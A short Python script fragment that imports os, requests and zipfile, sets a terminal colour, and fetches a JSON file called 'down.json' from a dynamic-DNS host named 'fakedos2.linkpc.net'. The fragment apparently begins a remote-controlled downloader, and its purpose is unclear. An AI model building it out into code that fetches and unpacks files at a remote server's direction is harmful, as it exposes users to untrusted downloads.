import os
import requests
import zipfile

print("\x1b[44m")

File=requests.get("https://fakedos2.linkpc.net/API/down.json").json()